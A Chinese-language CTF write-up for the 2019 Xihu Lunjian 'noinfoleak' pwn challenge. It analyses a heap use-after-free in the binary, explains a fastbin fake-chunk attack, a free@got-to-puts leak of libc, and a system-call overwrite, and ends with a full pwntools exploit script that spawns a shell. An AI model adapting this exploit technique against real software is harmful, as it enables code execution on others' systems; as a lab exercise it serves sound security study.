---
title: 2019-西湖论剑CTF-noinfoleak
date: 2019-04-10 21:38:31
tags:
---

## 0x00 程序分析

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

在程序delete功能 ，没有将free后的指针置为NULL
```c
void sub_4009DE()
{
  int v0; // [rsp+Ch] [rbp-4h]

  putchar(62);
  v0 = getint();
  if ( v0 >= 0 && v0 <= 15 )
    free(qword_6010A0[2 * v0]);
}
```

在程序edit功能，为对chunk指针是否被释放进行检查

```c
signed int sub_400A28()
{
  signed int result; // eax
  signed int v1; // [rsp+Ch] [rbp-4h]

  putchar(62);
  result = getint();
  v1 = result;
  if ( result >= 0 && result <= 15 )
  {
    putchar(62);
    result = read(0, qword_6010A0[2 * v1], (size_t)qword_6010A0[2 * v1 + 1]);
  }
  return result;
}
```

两处结合在一起，构成UAF漏洞

## 0x01 利用思路

程序有一个UAF漏洞

**1 UAF结合fastbin可以实现House of Spirit，将chunk分配到目标区域**

具体原理是fastchunk释放后，chunk中会被写入fd指针，指向下一个free fastchunk，因为存在UAF，所以可

以覆盖该fd指针，再次申请chunk时，就可以将chunk分配到fd指针指向的fake fastbin。

想要将这个fake fastbin分配出去，这里有个限制：

```c
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) // 如果取出来的fastbin和nb对应的fastbin不是一个下标
3578                {
3579                  errstr = "malloc(): memory corruption (fast)";
3580                errout:
3581                  malloc_printerr (check_action, errstr, chunk2mem (victim), av);
3582                  return NULL;
3583                }
```

取出来的fastbin和申请的chunk对应的fastbin必须是一个下标，这里都是fastbinsY[5]，因为fake fastbin的大小为0x7c(124)，申请的大小为0x70(112)，112≤fastbinsY[5]＜128

**2 修改free的got，制造信息泄露**

将chunk分配到目标区域后，这个目标区域距离.bss段存储堆指针的地址(0x6010A0)很近，因此可以写该地址的内存如下：

```
+------------+
|      0     |  # 0x6010A0  chunk0
+------------+
|  0x6010A0  |  # 0x6010A8	chunk1
+------------+
```

向chunk1 edit free@got后

```
+------------+
| free@got   |  # 0x6010A0  chunk0
+------------+
|  0x6010A0  |  # 0x6010A8	chunk1
+------------+
```

向chunk0 edit put@plt后

free@got -> put@plt，然后就有了信息输出，打印unsortedbin的fd(main_arena+88)，进而获得libc_base

## 0x02 EXP

```python
#/unr/bin/env python
from pwn import *
p = process('./noinfoleak')
elf = ELF('./noinfoleak')
libc = elf.libc
DEBUG = 0
VERBOSE = 1
if DEBUG:
	gdb.attach(p)
if VERBOSE:
	context.log_level = 'debug'

def q():
	gdb.attach(p)
	raw_input('test')

def add(size,content):
	p.recvuntil('>')
	p.sendline('1')
	p.recvuntil('>')
	p.sendline(str(size))
	p.recvuntil('>')
	p.send(content)
def delete(idx):
	p.recvuntil('>')
	p.sendline('2')
	p.recvuntil('>')
	p.sendline(str(idx))
def edit(idx,content):
	p.recvuntil('>')
	p.sendline('3')
	p.recvuntil('>')
	p.sendline(str(idx))
	p.recvuntil('>')
	p.send(content)
	
def pwn():
	add(0x5f,'0'*8)
	add(0x5f,'1'*8)
	add(0x7f,'2'*8) #unsortedbin chunk
	add(0x10,'3'*8)
	delete(0)
	delete(1)
	edit(1,p64(0x60108d))
	add(0x5f,'/bin/sh\x00')
	add(0x5f,'a'*3+p64(0)*2+p64(0x6010a0)*2)
	delete(2)	#get unsortedbin
	edit(1,p64(elf.got['free'])+p64(0x100))
	edit(0,p64(elf.plt['puts'])) #free->put
	delete(2)	#put the fd addr of unsortedbin
	libc_base = u64(p.recvuntil('\x0a',drop = True).ljust(8,'\x00'))-0x3C4B20-88
	log.success('libc_base:'+hex(libc_base))
	system = libc_base + libc.symbols['system']
	edit(0,p64(system))
	delete(4)
	p.interactive()
	
if __name__ == '__main__':
	pwn()

```



